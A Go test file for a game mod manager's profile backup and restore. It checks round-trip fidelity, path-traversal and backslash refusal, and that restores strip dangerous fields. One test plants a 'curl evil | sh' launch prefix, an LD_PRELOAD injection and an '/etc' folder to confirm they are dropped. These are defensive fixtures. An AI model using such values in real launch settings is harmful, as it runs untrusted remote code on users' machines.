package profile

import (
	"maps"
	"os"
	"path/filepath"
	"reflect"
	"slices"
	"strings"
	"testing"

	"github.com/Rethunk-Tech/mortar/internal/mod"
)

func TestBackupRestoresAnEqualProfileWithoutTheStore(t *testing.T) {
	t.Parallel()
	e := newEnv(t)
	e.item(t, "local-a", map[string]string{"A/manifest.json": manifestJSON("X.A")})
	e.item(t, "local-b", map[string]string{"B/manifest.json": manifestJSON("X.B")})
	p := mustCreate(t, e, "Farm")
	for _, key := range []string{"local-a", "local-b"} {
		if _, err := e.AddEntry("stardew", p.ID, key, Source{Kind: KindLocal, Name: key + ".zip"}); err != nil {
			t.Fatal(err)
		}
	}
	steps := []func() (Profile, error){
		func() (Profile, error) { return e.SetNotes("stardew", p.ID, "spring run") },
		func() (Profile, error) {
			return e.SetEntryNoteTags("stardew", p.ID, "local-a", "keep", []string{"core"})
		},
		func() (Profile, error) { return e.SetPinned("stardew", p.ID, "local-a", true, "works") },
		func() (Profile, error) { return e.SetLaunchOptions("stardew", p.ID, "--log-mode") },
		func() (Profile, error) { return e.SetModEnabled("stardew", p.ID, "local-b", "smapi:X.B", false) },
	}
	for _, step := range steps {
		if _, err := step(); err != nil {
			t.Fatal(err)
		}
	}
	if _, err := e.Mods("stardew", p.ID); err != nil {
		t.Fatal(err)
	}
	writeFile(t, e.mods(p.ID), "local-a/A/config.json", `{"Speed":3}`)
	writeFile(t, filepath.Join(e.root, "stardew", p.ID), "BepInEx/config/x.cfg", "[x]\n")

	src, files, err := e.Backup("stardew", p.ID)
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{historyFile, "mods/local-a/A/config.json", "BepInEx/config/x.cfg"} {
		if _, ok := files[want]; !ok {
			t.Fatalf("backup lacks %s: %v", want, slices.Sorted(maps.Keys(files)))
		}
	}

	got, missing, err := e.RestoreBackup(t.Context(), "stardew", src, files, nil)
	if err != nil || len(missing) != 0 {
		t.Fatalf("restore: missing %v, %v", missing, err)
	}
	if _, err := e.Mods("stardew", got.ID); err != nil {
		t.Fatal(err)
	}
	again, againFiles, err := e.Backup("stardew", got.ID)
	if err != nil {
		t.Fatal(err)
	}
	if again.Name == src.Name || again.ID == src.ID {
		t.Fatalf("restore must make a new profile, got %s %q", again.ID, again.Name)
	}
	norm := func(q Profile) Profile {
		q.ID, q.Name, q.Order, q.Created, q.Updated, q.FormatVersion = "", "", 0, src.Created, src.Updated, 0
		return q
	}
	if !reflect.DeepEqual(norm(again), norm(src)) {
		t.Fatalf("restored\n%+v\nwant\n%+v", norm(again), norm(src))
	}
	if !maps.EqualFunc(againFiles, files, func(a, b []byte) bool { return string(a) == string(b) }) {
		t.Fatalf("restored files %v, want %v", slices.Sorted(maps.Keys(againFiles)), slices.Sorted(maps.Keys(files)))
	}
	if _, err := os.Stat(filepath.Join(e.root, "stardew", got.ID, restoreDir)); !os.IsNotExist(err) {
		t.Fatalf("restore/ must be gone once the mods are placed: %v", err)
	}

	fresh := newEnv(t)
	_, missing, err = fresh.RestoreBackup(t.Context(), "stardew", src, files, nil)
	if err != nil || len(missing) != 2 {
		t.Fatalf("a computer without the store items must download both: %v, %v", missing, err)
	}
	if _, _, err := e.RestoreBackup(t.Context(), "stardew", src, map[string][]byte{"../escape.json": nil}, nil); err == nil {
		t.Fatal("a path outside the profile must be refused")
	}
}

func TestBackupLeavesTheServerDataFolderOut(t *testing.T) {
	t.Parallel()
	e := newEnv(t)
	p := mustCreate(t, e, "Farm")
	dir, err := e.ProfileDir("stardew", p.ID)
	if err != nil {
		t.Fatal(err)
	}
	writeFile(t, dir, ServerDataFolder+"/serverconfig.json", `{"Password":"hunter2"}`)
	_, files, err := e.Backup("stardew", p.ID)
	if err != nil {
		t.Fatal(err)
	}
	for rel := range files {
		if strings.HasPrefix(rel, ServerDataFolder) {
			t.Errorf("backup carries %s", rel)
		}
	}
}

func TestRestoreKeepsEveryProgramAndPlaceFieldOfTheBackupLocal(t *testing.T) {
	t.Parallel()
	e := newEnv(t)
	p := mustCreate(t, e, "Farm")
	src, files, err := e.Backup("stardew", p.ID)
	if err != nil {
		t.Fatal(err)
	}
	src.Notes, src.LaunchOptions = "keep me", "--log-mode"
	src.LaunchPrefix, src.LaunchEnv = "sh -c 'curl evil | sh' x", "LD_PRELOAD=/tmp/x.so"
	src.Install, src.Folder = "gog", "/etc"
	src.Overrides = map[string]string{"defaultLaunchMethod": "direct"}
	src.LaunchPresets = []LaunchPreset{{ID: "a", Name: "Fast", LaunchOptions: "--fast", LaunchPrefix: "evil", LaunchEnv: "A=1"}}

	got, _, err := e.RestoreBackup(t.Context(), "stardew", src, files, nil)
	if err != nil {
		t.Fatal(err)
	}
	disk, err := e.Get("stardew", got.ID)
	if err != nil {
		t.Fatal(err)
	}
	for _, q := range []Profile{got, disk} {
		if q.LaunchPrefix != "" || q.LaunchEnv != "" || q.Install != "" || q.Folder != "" || len(q.Overrides) != 0 {
			t.Fatalf("restored a program or place field: %+v", q)
		}
		if len(q.LaunchPresets) != 1 || q.LaunchPresets[0].LaunchPrefix != "" || q.LaunchPresets[0].LaunchEnv != "" || q.LaunchPresets[0].LaunchOptions != "--fast" {
			t.Fatalf("preset = %+v", q.LaunchPresets)
		}
		if q.Notes != "keep me" || q.LaunchOptions != "--log-mode" {
			t.Fatalf("data fields lost: %+v", q)
		}
	}
}

// A pack or a restored backup may not smuggle a Windows separator in as a plain character of a name.
func TestWriteFilesRefusesABackslashPath(t *testing.T) {
	t.Parallel()
	e := newEnv(t)
	p := mustCreate(t, e, "Farm")
	dir, err := e.ProfileDir("stardew", p.ID)
	if err != nil {
		t.Fatal(err)
	}
	if err := e.WriteFiles("stardew", p.ID, map[string][]byte{`BepInEx/config/a\b.cfg`: []byte("x")}); err == nil {
		t.Fatal("a backslash path was written")
	}
	if _, err := os.Stat(filepath.Join(dir, "BepInEx", "config", `a\b.cfg`)); err == nil {
		t.Fatal("the file landed under a name with a backslash in it")
	}
}

func TestBackupPathRefusesAManifestAndAnOversizedConfig(t *testing.T) {
	t.Parallel()
	p := Profile{Entries: []Entry{{Key: "pack"}}}
	small := 8
	if !backupPath("mods/pack/A/config.json", p, small) {
		t.Fatal("a mod's config.json was refused")
	}
	for _, rel := range []string{"mods/pack/A/manifest.json", "mods/pack/A/MANIFEST.JSON", `mods/pack/A/c\onfig.json`, "../escape.json"} {
		if backupPath(rel, p, small) {
			t.Errorf("%s was accepted", rel)
		}
	}
	if backupPath("mods/pack/A/config.json", p, maxBackupConfig+1) {
		t.Error("an oversized config was accepted")
	}
}

// A backup names its entries, and a key that leaves the mods folder is refused rather than dropped.
func TestRestoreBackupRefusesABadEntryKey(t *testing.T) {
	t.Parallel()
	e := newEnv(t)
	before, err := e.List("stardew")
	if err != nil {
		t.Fatal(err)
	}
	bad := Profile{Name: "Bad", Entries: []Entry{{Key: "../x", Disabled: []mod.ID{}}}}
	if _, _, err := e.RestoreBackup(t.Context(), "stardew", bad, nil, nil); err == nil {
		t.Fatal("a backup with a key outside the mods folder was restored")
	}
	after, err := e.List("stardew")
	if err != nil {
		t.Fatal(err)
	}
	if len(after) != len(before) {
		t.Fatalf("a refused restore left %d profiles, want %d", len(after), len(before))
	}
}

// The Mods tab's manual sort is the player's, like the profile's groups, so a restore keeps it.
func TestRestoreKeepsTheModOrder(t *testing.T) {
	t.Parallel()
	e := newEnv(t)
	for _, key := range []string{"local-a", "local-b"} {
		e.item(t, key, map[string]string{"A/manifest.json": manifestJSON("X." + key)})
	}
	p := mustCreate(t, e, "Farm")
	for _, key := range []string{"local-a", "local-b"} {
		if _, err := e.AddEntry("stardew", p.ID, key, Source{Kind: KindLocal, Name: key + ".zip"}); err != nil {
			t.Fatal(err)
		}
	}
	if _, err := e.SetModOrder("stardew", p.ID, []string{"local-b", "local-a"}); err != nil {
		t.Fatal(err)
	}
	src, files, err := e.Backup("stardew", p.ID)
	if err != nil {
		t.Fatal(err)
	}
	got, _, err := e.RestoreBackup(t.Context(), "stardew", src, files, nil)
	if err != nil {
		t.Fatal(err)
	}
	if !slices.Equal(got.ModOrder, []string{"local-b", "local-a"}) {
		t.Fatalf("mod order after a restore = %v", got.ModOrder)
	}
}
